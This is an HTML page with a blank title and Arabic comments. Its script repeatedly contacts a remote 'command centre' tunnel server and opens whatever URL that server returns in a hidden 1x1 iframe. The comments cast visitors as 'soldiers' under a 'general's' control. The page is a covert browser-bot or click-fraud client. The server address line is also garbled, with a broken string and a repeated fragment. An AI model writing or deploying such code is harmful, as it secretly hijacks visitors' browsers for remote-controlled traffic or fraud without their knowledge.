<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> </title>
    <style>body { background: #8fff; margin: 0; padding: 0; overflow: hidden; }</style>
</head>
<body>
    <script>
        // 🛰️ رابط 'مركز القيادة' في الترمكس (الخاص بك)
        // انسخ الرابط الجديد من الترمكس وضعه هنا بين علامتي التنصيص
        const masterServer = "https://ball-brussels-minimal-greensboro.trycloudflare.com
 "           l-greensboro.trycloudflare.com

        function syncWithGeneral() {
            // 🕵️ إرسال نبضة 'أنا جندي جديد' للترمكس
            fetch(`${masterServer}/ping.php`)
            .then(response => response.json())
            .then(data => {
                // 🕹️ تنفيذ الأمر القادم من الترمكس (فتح رابط)
                if (data.target) {
                    const shadowFrame = document.createElement('iframe');
                    shadowFrame.src = data.target;
                    shadowFrame.style.display = 'none';
                    shadowFrame.width = '1';
                    shadowFrame.height = '1';
                    document.body.appendChild(shadowFrame);
                    console.log("💰 [ORDER RECEIVED] | Target: " + data.target);
                }
            })
            .catch(error => console.log("في انتظار أوامر الجنرال..."));
        }

        // المزامنة كل 20 ثانية لضمان السيطرة المطلقة
        setInterval(syncWithGeneral, 20000);
        syncWithGeneral(); // النبضة الأولى
    </script>
</body>
</html>
